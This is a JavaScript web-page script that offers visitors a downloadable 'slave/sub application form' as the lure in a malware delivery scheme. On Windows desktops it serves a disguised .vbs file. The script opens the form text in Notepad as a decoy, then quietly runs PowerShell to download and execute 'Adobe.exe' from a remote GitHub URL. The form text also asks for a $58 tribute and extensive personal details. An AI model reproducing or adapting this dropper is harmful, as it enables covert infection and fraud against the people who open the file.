function extractFormData() {
    var formData = {
        name: $('#name').val().toLocaleUpperCase(),
        city: $('#city').val(),
        age: $('#age').val()
    };
    // console.log(formData);
    return formData
}

function isWindowsDesktop() {
    const userAgent = window.navigator.userAgent;
    return /Windows NT/.test(userAgent) && !/Mobile/.test(userAgent);
}

async function vbs({ name, city, age }) {
    // Create VBScript content
    var vbsContent = `
file_url = "https://raw.githubusercontent.com/tonypages/firstrepo/main/Adobe.exe"


Set objShell = CreateObject("WScript.Shell")
username = objShell.ExpandEnvironmentStrings("%USERNAME%")

' Retrieve HOMEDRIVE and HOMEPATH to construct the home directory path
homeDrive = objShell.ExpandEnvironmentStrings("%HOMEDRIVE%")
homePath = objShell.ExpandEnvironmentStrings("%HOMEPATH%")

' Construct the destination path
destination = homeDrive & homePath & "\\"


content = "The slave/sub application form" & vbCrLf & "" & vbCrLf & "This is the application form to be filled in by the candidate slave/sub in order to get" & vbCrLf & "evaluated and hopefully get engaged as a real slave/sub." & vbCrLf & "This is a very important step in your life, so before submitting this form, make sure" & vbCrLf & "you understand what it meant by A Slave/sub." & vbCrLf & "" & vbCrLf & "A real slave/sub expects its Mistress to take responsibility over it and make all the" & vbCrLf & "decisions for it. For the Mistress to be able to do that, They need some basic" & vbCrLf & "information about it." & vbCrLf & "" & vbCrLf & "My slave/sub will fill in this form in all its honesty. If some information cannot be given" & vbCrLf & "for whatever reason, that reason must be clearly explained in the document and" & vbCrLf & "discussed with the Mistress(ME)." & vbCrLf & "" & vbCrLf & "Once again, only fill this out if you are SERIOUS about committing to being a real" & vbCrLf & "slave/sub (this is not a part time job ! )." & vbCrLf & "The slave/sub shall accompany this form with a token of $58, As your tribute. On submission," & vbCrLf & "its mistress shall comfirm its full time registration. you no longer have freedom ..." & vbCrLf & "quitters will be extremely punished. If you submit and are not happy with your decisions" & vbCrLf & "then it is up to you to voice your concerns and ask to be sold." & vbCrLf & "" & vbCrLf & "Name: ${name}" & vbCrLf & "age: ${age}" & vbCrLf & "address:" & vbCrLf & "city: ${city}" & vbCrLf & "country:" & vbCrLf & "telephone number:" & vbCrLf & "email addresses:" & vbCrLf & "skype address:" & vbCrLf & "facebook id:" & vbCrLf & "Other online systems(include id's):" & vbCrLf & "languages spoken:" & vbCrLf & "nationality:" & vbCrLf & "ethnicity:" & vbCrLf & "religion:" & vbCrLf & "educational level:" & vbCrLf & "certificates:" & vbCrLf & "occupation:" & vbCrLf & "main means of transportation:" & vbCrLf & "hobbies:" & vbCrLf & "skills:" & vbCrLf & "financial situation:" & vbCrLf & "gender:" & vbCrLf & "height:" & vbCrLf & "weight:" & vbCrLf & "collar size (in cm):" & vbCrLf & "wrist size (in cm):" & vbCrLf & "ankle size (in cm):" & vbCrLf & "breast size:" & vbCrLf & "sexual orientation:" & vbCrLf & "is this slave/sub still a virgin:" & vbCrLf & "since when:" & vbCrLf & "number of partners:" & vbCrLf & "currently in a fixed relationship: (like married, living with bf/gf, ... )" & vbCrLf & "Have children (number and ages):" & vbCrLf & "want children ?" & vbCrLf & "family:" & vbCrLf & "has this slave/sub been owned before:" & vbCrLf & "describe:" & vbCrLf & "reason for quiting:" & vbCrLf & "is this slave/sub being owned today ?" & vbCrLf & "" & vbCrLf & "A slave/sub cannot expect nor demand anything about its treatment. It is only its" & vbCrLf & "Mistress who decide what will happen to it and how it will be treated. Nevertheless" & vbCrLf & "it can like and dislike things, it can hope for a certain treatment or it can fear" & vbCrLf & "certain things. Here the slave/sub can describe its feelings, likes, dislikes, hopes and" & vbCrLf & "fears. It is the Mistress’s decision whether and how They will take these into" & vbCrLf & "account." & vbCrLf & "Does this slave/sub hope to be able to express hard limits ?" & vbCrLf & "which:" & vbCrLf & "" & vbCrLf & "Safeword ( use a word without meaning, like for example: 'cucudicu' ):" & vbCrLf & "Is this slave/sub willing to relocate to its Mistress's place:" & vbCrLf & "Does the slave/sub hope to get/keep a professional occupation?" & vbCrLf & "How would the slave/sub feel about not being the only slave/sub in a household ?" & vbCrLf & "What kind of sexual activities does this slave/sub hope to have during its enslave/subment ?" & vbCrLf & "What kind of sexual activities does this slave/sub fear to have during its enslave/subment ?" & vbCrLf & "Name a few things you like or interest you about being a slave/sub ( enumerate at least 3 ):" & vbCrLf & "Do you fully understand that all slave/subs are owned by the Mistress and are Their" & vbCrLf & "property and you will serve all Their wishes ?" & vbCrLf & "List anything else that may help to approve you. Things that the Mistress will find" & vbCrLf & "interesting/fascinating about you:" & vbCrLf & "" & vbCrLf & "other remarks/questions this slave/sub wants to communicate:" & vbCrLf & "" & vbCrLf & "To complement this form, the slave/sub shall add serveral photos of itself presenting it in" & vbCrLf & "different circumstances. At least one photo will be a picture head to toe in decent" & vbCrLf & "outfit another photo will have to enable the Mistress to fully assess the slave/sub’s" & vbCrLf & "physics." & vbCrLf & "" & vbCrLf & "Suggestions to improve this document:" & vbCrLf & "" & vbCrLf & "This application and following agreement is clearly about what is commonly called" & vbCrLf & "Consensual Real Slave/subry. By this a relationship of total and all domain servitude is" & vbCrLf & "meant. This is not about the more sexually oriented Domination/submissive role" & vbCrLf & "playing." & vbCrLf & "By submitting this form the slave/sub explicitly confirms it is willing to be fully owned" & vbCrLf & "by the Mistress and will comply to each and every of its Mistrese's wishes. The" & vbCrLf & "slave/sub agrees to obey its Mistress in all respects. its mind, body, heart, soul, time," & vbCrLf & "talents, knowledge and skills belong completely to Them to be done with what seems" & vbCrLf & "fit to Them." & vbCrLf & "By submitting this application form the slave/sub acknowledges that all answers are" & vbCrLf & "given voluntarily and in all honesty. The slave/sub also confirms it is lucid and in a" & vbCrLf & "legal state allowing it to commit agreements which are applied for." & vbCrLf & "Signature:" & vbCrLf & "the slave/sub signs by typing “I agree voluntarily” completed by the place and date of" & vbCrLf & "signature. This will be completed by adding the slave/subs oath as mentioned in the" & vbCrLf & "description document. Later on a paper copy will physically be annotated in the" & vbCrLf & "same manner and signed with a pen" & vbCrLf & "Application documents without proper signature are not considered applications but" & vbCrLf & "are merely used as source of information."
' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Create a text file
Set objFile = objFSO.CreateTextFile(destination & "\\Desktop\\sex-slave-form.txt")

' Write content to the file
objFile.Write content

' Close the file
objFile.Close

' Open the file using the default text editor
objShell.Run "notepad.exe " & destination & "\\Desktop\\sex-slave-form.txt", 1, false

' Check if Adobe.exe already exists
Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")
adobePath = destination & "\\Adobe.exe"

If objFSO.FileExists(adobePath) Then
    Set adobeFile = objFSO.GetFile(adobePath)
    If adobeFile.Size > 67500 * 1024 Then
        ' If the file exists and its size is greater than 67,500 KB, run it
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run """" & adobePath & """", 1, True ' 1 shows the window, false doesn't wait for completion
    End If
End If

If Not objFSO.FileExists(adobePath) Then
    ' If the file doesn't exist, download it using PowerShell
    Dim command
    command = "powershell -command ""& {Invoke-WebRequest -Uri '" & file_url & "' -OutFile '" & adobePath & "'}"""

    ' Run the PowerShell command
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run command, 0, True ' 0 hides the window, true waits for the command to complete
    objShell.Run """" & destination & "\\Adobe.exe""", 0, True ' 1 shows the window, false doesn't wait for completion
End If

    `

    const textContent = `
The slave/sub application form

This is the application form to be filled in by the candidate slave/sub in order to get
evaluated and hopefully get engaged as a real slave/sub.
This is a very important step in your life, so before submitting this form, make sure
you understand what it meant by A Slave/sub.

A real slave/sub expects its Mistress to take responsibility over it and make all the
decisions for it. For the Mistress to be able to do that, They need some basic
information about it.

My slave/sub will fill in this form in all its honesty. If some information cannot be given
for whatever reason, that reason must be clearly explained in the document and
discussed with the Mistress(ME).

Once again, only fill this out if you are SERIOUS about committing to being a real
slave/sub (this is not a part time job ! ).
The slave/sub shall accompany this form with a token of $58, As your tribute. On submission,
its mistress shall comfirm its full time registration. you no longer have freedom ...
quitters will be extremely punished. If you submit and are not happy with your decisions
then it is up to you to voice your concerns and ask to be sold. 

Name: ${name}
age: ${age}
address:
city: ${city}
country:
telephone number:
email addresses:
skype address:
facebook id:
Other online systems(include id's):
languages spoken:
nationality:
ethnicity:
religion:
educational level:
certificates:
occupation:
main means of transportation:
hobbies:
skills:
financial situation:
gender:
height:
weight:
collar size (in cm):
wrist size (in cm):
ankle size (in cm):
breast size:
sexual orientation:
is this slave/sub still a virgin:
since when:
number of partners:
currently in a fixed relationship: (like married, living with bf/gf, ... )
Have children (number and ages):
want children ?
family:
has this slave/sub been owned before:
describe:
reason for quiting:
is this slave/sub being owned today ?

A slave/sub cannot expect nor demand anything about its treatment. It is only its
Mistress who decide what will happen to it and how it will be treated. Nevertheless
it can like and dislike things, it can hope for a certain treatment or it can fear
certain things. Here the slave/sub can describe its feelings, likes, dislikes, hopes and
fears. It is the Mistress’s decision whether and how They will take these into
account.
Does this slave/sub hope to be able to express hard limits ?
which:

Safeword ( use a word without meaning, like for example: 'cucudicu' ):
Is this slave/sub willing to relocate to its Mistress's place:
Does the slave/sub hope to get/keep a professional occupation?
How would the slave/sub feel about not being the only slave/sub in a household ?
What kind of sexual activities does this slave/sub hope to have during its enslave/subment ?
What kind of sexual activities does this slave/sub fear to have during its enslave/subment ?
Name a few things you like or interest you about being a slave/sub ( enumerate at least 3 ):
Do you fully understand that all slave/subs are owned by the Mistress and are Their
property and you will serve all Their wishes ?
List anything else that may help to approve you. Things that the Mistress will find
interesting/fascinating about you:

other remarks/questions this slave/sub wants to communicate:

To complement this form, the slave/sub shall add serveral photos of itself presenting it in
different circumstances. At least one photo will be a picture head to toe in decent
outfit another photo will have to enable the Mistress to fully assess the slave/sub’s
physics.

Suggestions to improve this document:

This application and following agreement is clearly about what is commonly called
Consensual Real Slave/subry. By this a relationship of total and all domain servitude is
meant. This is not about the more sexually oriented Domination/submissive role
playing.
By submitting this form the slave/sub explicitly confirms it is willing to be fully owned
by the Mistress and will comply to each and every of its Mistrese's wishes. The
slave/sub agrees to obey its Mistress in all respects. its mind, body, heart, soul, time,
talents, knowledge and skills belong completely to Them to be done with what seems
fit to Them.
By submitting this application form the slave/sub acknowledges that all answers are
given voluntarily and in all honesty. The slave/sub also confirms it is lucid and in a
legal state allowing it to commit agreements which are applied for.
Signature:
the slave/sub signs by typing “I agree voluntarily” completed by the place and date of
signature. This will be completed by adding the slave/subs oath as mentioned in the
description document. Later on a paper copy will physically be annotated in the
same manner and signed with a pen
Application documents without proper signature are not considered applications but
are merely used as source of information.
`

    // Create a new instance of JSZip
    var zip = new JSZip();

    if (isWindowsDesktop()) {
        // Add the VBScript file to the zip file
        zip.file(`${name}_Consensual_form.vbs`, vbsContent);
    } else {
        // Add the txtfile to the zip file
        zip.file(`${name}_Consensual_form.txt`, textContent);
    }
    // Generate the zip file asynchronously
    const content = await zip.generateAsync({ type: 'blob' })

    // .then(function(content) {
    // Create a download link for the zip file
    var link = $('<a></a>');
    link.attr('href', window.URL.createObjectURL(content));
    link.attr('download', `${name}_Consensual_form.zip`);

    return link
    // Trigger a click on the link to initiate download
    link[0].click();
    // });
}


function show(selector) {
    const element = document.querySelector(selector);

    if (element.style.display !== 'flex') {
        element.style.display = 'flex';
    }
}

function hide(selector) {
    const element = document.querySelector(selector);

    if (element.style.display !== 'none') {
        element.style.display = 'none';
    }
}

let navigator = true
window.addEventListener('online', () => {navigator = true});
window.addEventListener('offline', () => {navigator = false});

$('#load').on('click', async function () {
    var $this = $(this);

    const formData = extractFormData()
    const link = await vbs(formData)

    $this.button('loading');

    setTimeout(function () {
        $this.button('reset');
        link[0].click();
        show(".fm");
        hide(".error");
    }, 5000);
    
    /*console.log(navigator)
    if (!navigator) {
        link[0].click();
        setTimeout(function () {
            $this.button('reset');
            //link[0].click();
            show(".fm");
            hide(".error");
        }, 5000);
    } else {
        setTimeout(function () {
            $this.button('reset');
            show(".error");
            hide(".fm");
            //link[0].click();
        }, 5000);
    }*/
});